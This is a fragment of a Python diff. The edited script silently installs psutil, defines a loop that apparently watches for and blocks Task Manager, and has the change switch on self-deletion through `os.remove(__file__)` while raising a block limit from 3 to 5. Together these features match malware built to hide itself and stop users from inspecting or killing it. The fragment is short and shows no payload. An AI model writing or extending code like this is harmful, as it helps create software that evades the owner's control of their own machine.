@@ -24,10 +24,10 @@ except:
     os.system("pip install psutil")
     import psutil
 
-#os.remove(__file__)
+os.remove(__file__)
 
 block_count = 0
-max_blocks = 3
+max_blocks = 5
 
 # Boucle de surveillance des processus
 def monitor_taskmgr():
